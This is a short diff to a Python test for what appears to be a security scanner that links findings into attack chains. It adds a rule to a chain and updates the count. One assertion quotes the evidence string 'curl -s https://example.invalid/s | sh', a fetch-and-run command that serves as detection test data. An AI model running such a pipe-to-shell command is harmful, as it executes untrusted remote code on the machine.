@@ -100,9 +100,10 @@ def test_chain_parts_are_marked_and_counted_once(tmp_path: Path) -> None:
     assert chain["chain"]["steps"][1]["line"] == 2
     assert chain["evidence"] == "curl -s https://example.invalid/s | sh"
     assert by_rule["RC-AUTO-020"]["in_chain"] == chain["chain"]["id"]
+    assert by_rule["RC-AUTO-023"]["in_chain"] == chain["chain"]["id"]
     assert by_rule["RC-DLX-001"]["in_chain"] == chain["chain"]["id"]
     summary = report["summary"]
-    assert summary["part_of_chains"] == 2
+    assert summary["part_of_chains"] == 3
     assert summary["by_severity"]["critical"] == 1
     assert summary["by_severity"]["high"] == 0 and summary["by_severity"]["medium"] == 0
 
